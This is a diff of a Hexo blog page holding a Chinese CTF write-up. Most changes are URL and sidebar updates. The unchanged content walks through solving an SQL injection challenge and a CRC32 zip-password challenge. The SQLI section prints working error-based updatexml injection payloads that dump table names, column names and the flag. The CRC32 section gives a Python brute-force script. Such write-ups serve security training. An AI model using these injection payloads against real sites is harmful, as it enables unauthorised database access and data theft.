@@ -65,20 +65,20 @@
 <meta name="keywords" content="WEB,CTF">
 <meta property="og:type" content="article">
 <meta property="og:title" content="51ELAB易霖博YCTF">
-<meta property="og:url" content="https://0xcreed.jxustctf.top/2020/03/51ELAB易霖博YCTF-WP/index.html">
+<meta property="og:url" content="https://0xcreed.jxustctf.top/2020/03/51ELAB易霖博YCTF-Writeup/index.html">
 <meta property="og:site_name" content="0xCreed">
 <meta property="og:description" content="好多原题">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:image" content="https://0xcreed.jxustctf.top/2020/03/51ELAB易霖博YCTF-WP/image-20200415185646715.png">
-<meta property="og:image" content="https://0xcreed.jxustctf.top/2020/03/51ELAB易霖博YCTF-WP/image-20200415204058693.png">
-<meta property="og:image" content="https://0xcreed.jxustctf.top/2020/03/51ELAB易霖博YCTF-WP/image-20200415215316552.png">
-<meta property="og:image" content="https://0xcreed.jxustctf.top/2020/03/51ELAB易霖博YCTF-WP/image-20200415215428837.png">
+<meta property="og:image" content="https://0xcreed.jxustctf.top/2020/03/51ELAB易霖博YCTF-Writeup/image-20200415185646715.png">
+<meta property="og:image" content="https://0xcreed.jxustctf.top/2020/03/51ELAB易霖博YCTF-Writeup/image-20200415204058693.png">
+<meta property="og:image" content="https://0xcreed.jxustctf.top/2020/03/51ELAB易霖博YCTF-Writeup/image-20200415215316552.png">
+<meta property="og:image" content="https://0xcreed.jxustctf.top/2020/03/51ELAB易霖博YCTF-Writeup/image-20200415215428837.png">
 <meta property="og:updated_time" content="2020-04-15T13:56:21.545Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="51ELAB易霖博YCTF">
 <meta name="twitter:description" content="好多原题">
-<meta name="twitter:image" content="https://0xcreed.jxustctf.top/2020/03/51ELAB易霖博YCTF-WP/image-20200415185646715.png">
-  <link rel="canonical" href="https://0xcreed.jxustctf.top/2020/03/51ELAB易霖博YCTF-WP/">
+<meta name="twitter:image" content="https://0xcreed.jxustctf.top/2020/03/51ELAB易霖博YCTF-Writeup/image-20200415185646715.png">
+  <link rel="canonical" href="https://0xcreed.jxustctf.top/2020/03/51ELAB易霖博YCTF-Writeup/">
 
 
 <script id="page-configurations">
@@ -262,7 +262,7 @@
       
     
 
-    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档<span class="badge">24</span></a>
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档<span class="badge">25</span></a>
 
   </li>
       
@@ -339,7 +339,7 @@
   
   
   <div class="post-block post">
-    <link itemprop="mainEntityOfPage" href="https://0xcreed.jxustctf.top/2020/03/51ELAB易霖博YCTF-WP/">
+    <link itemprop="mainEntityOfPage" href="https://0xcreed.jxustctf.top/2020/03/51ELAB易霖博YCTF-Writeup/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="0xCreed">
@@ -415,7 +415,7 @@
       
       <span class="post-meta-item-text">Valine：</span>
     
-    <a title="valine" href="/2020/03/51ELAB易霖博YCTF-WP/#comments" itemprop="discussionUrl"><span class="post-comments-count valine-comment-count" data-xid="/2020/03/51ELAB易霖博YCTF-WP/" itemprop="commentCount"></span></a>
+    <a title="valine" href="/2020/03/51ELAB易霖博YCTF-Writeup/#comments" itemprop="discussionUrl"><span class="post-comments-count valine-comment-count" data-xid="/2020/03/51ELAB易霖博YCTF-Writeup/" itemprop="commentCount"></span></a>
   </span>
   
   
@@ -485,10 +485,10 @@
 <h3 id="3-SQLI"><a href="#3-SQLI" class="headerlink" title="3.SQLI"></a>3.SQLI</h3><p>RCTF2015的原题</p>
 <p>正常套路，先fuzz下</p>
 <p>以下是被过滤的字符</p>
-<p><img src="/2020/03/51ELAB易霖博YCTF-WP/image-20200415185646715.png" alt="image-20200415185646715"></p>
+<p><img src="/2020/03/51ELAB易霖博YCTF-Writeup/image-20200415185646715.png" alt="image-20200415185646715"></p>
 <p>注册一个正常的用户，登录后发现可以修改密码，怀疑是二次注入</p>
 <p>就有注册 <code>sss&quot;1</code>的用户，登陆后进入修改密码的页面，发现报错了</p>
-<p><img src="/2020/03/51ELAB易霖博YCTF-WP/image-20200415204058693.png" alt="image-20200415204058693"></p>
+<p><img src="/2020/03/51ELAB易霖博YCTF-Writeup/image-20200415204058693.png" alt="image-20200415204058693"></p>
 <p>接着构造payload</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">爆表</span><br><span class="line">sss&quot;||updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),0x7e),1)#</span><br><span class="line">XPATH syntax error: &apos;~article,flag,users~&apos;</span><br><span class="line"></span><br><span class="line">column</span><br><span class="line">sss&quot;||updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_schema=database())),0x7e),1)#</span><br><span class="line">XPATH syntax error: &apos;~title,content,flag,name,pwd,ema&apos;</span><br><span class="line"></span><br><span class="line">flag</span><br><span class="line">sss&quot;||updatexml(1,concat(0x7e,(select(flag)from(flag)),0x7e),1)#</span><br><span class="line">XPATH syntax error: &apos;~flag&#123;19de358061&#125;~&apos;</span><br></pre></td></tr></table></figure>
 
@@ -508,10 +508,10 @@
 <h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="1-CRC32"><a href="#1-CRC32" class="headerlink" title="1.CRC32"></a>1.CRC32</h3><p>压缩包中有三个文件存放了解压密码</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="keyword">global</span> flag</span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">CrackCrc</span><span class="params">(crc, I)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> dic:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> dic:</span><br><span class="line">            <span class="keyword">for</span> p <span class="keyword">in</span> dic:</span><br><span class="line">                <span class="keyword">for</span> q <span class="keyword">in</span> dic:</span><br><span class="line">                    s = i + j + p + q</span><br><span class="line">                    <span class="keyword">if</span> crc == (binascii.crc32(s.encode())):</span><br><span class="line">                        print(str(I) + <span class="string">":"</span> + s)</span><br><span class="line">                        <span class="keyword">global</span> flag</span><br><span class="line">                        flag = flag + s</span><br><span class="line">                        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">CrackZip</span><span class="params">()</span>:</span></span><br><span class="line">    f = zipfile.ZipFile(<span class="string">"CRC32.zip"</span>, <span class="string">'r'</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">4</span>):</span><br><span class="line">        GetCrc = f.getinfo(<span class="string">'pass'</span>+str(i)+<span class="string">'.txt'</span>)</span><br><span class="line">        crc = GetCrc.CRC</span><br><span class="line">        print(crc)</span><br><span class="line">        CrackCrc(crc, i)</span><br><span class="line">dic = string.printable</span><br><span class="line">CrackZip()</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>
 
-<p>   <img src="/2020/03/51ELAB易霖博YCTF-WP/image-20200415215316552.png" alt="image-20200415215316552">                            </p>
+<p>   <img src="/2020/03/51ELAB易霖博YCTF-Writeup/image-20200415215316552.png" alt="image-20200415215316552">                            </p>
 <p>解压得到flag</p>
 <h3 id="2-easyrsa"><a href="#2-easyrsa" class="headerlink" title="2.easyrsa"></a>2.easyrsa</h3><p>给了私钥和密文</p>
-<p><img src="/2020/03/51ELAB易霖博YCTF-WP/image-20200415215428837.png" alt="image-20200415215428837"></p>
+<p><img src="/2020/03/51ELAB易霖博YCTF-Writeup/image-20200415215428837.png" alt="image-20200415215428837"></p>
 
     </div>
 
@@ -525,6 +525,13 @@
       
       
       <div class="popular-posts-title"><a href="\2020\07\DASCTF-7月赛\" rel="bookmark">DASCTF_7月赛</a></div>
+      
+    </li>
+  
+    <li class="popular-posts-item">
+      
+      
+      <div class="popular-posts-title"><a href="\2020\08\第十三届全国大学生信息安全竞赛初赛Writeup\" rel="bookmark">第十三届全国大学生信息安全竞赛初赛Writeup</a></div>
       
     </li>
   
@@ -549,13 +556,6 @@
       
     </li>
   
-    <li class="popular-posts-item">
-      
-      
-      <div class="popular-posts-title"><a href="\2020\06\命令执行与绕过\" rel="bookmark">命令执行与绕过</a></div>
-      
-    </li>
-  
   </ul>
 
         
@@ -568,7 +568,7 @@
     <strong>本文作者： </strong>0xCreed</li>
   <li class="post-copyright-link">
     <strong>本文链接：</strong>
-    <a href="https://0xcreed.jxustctf.top/2020/03/51ELAB易霖博YCTF-WP/" title="51ELAB易霖博YCTF">https://0xcreed.jxustctf.top/2020/03/51ELAB易霖博YCTF-WP/</a>
+    <a href="https://0xcreed.jxustctf.top/2020/03/51ELAB易霖博YCTF-Writeup/" title="51ELAB易霖博YCTF">https://0xcreed.jxustctf.top/2020/03/51ELAB易霖博YCTF-Writeup/</a>
   </li>
   <li class="post-copyright-license">
     <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！</li>
@@ -690,7 +690,7 @@
         
           <a href="/archives/">
         
-          <span class="site-state-item-count">24</span>
+          <span class="site-state-item-count">25</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -806,14 +806,14 @@
     </span>
       <span class="post-meta-item-text">站点总字数：</span>
     
-    <span title="站点总字数">190k</span>
+    <span title="站点总字数">620k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
       <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
     
-    <span title="站点阅读时长">2:53</span>
+    <span title="站点阅读时长">9:23</span>
 </div>
   <div class="powered-by">由 <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> 强力驱动 v3.9.0</div>
   <span class="post-meta-divider">|</span>
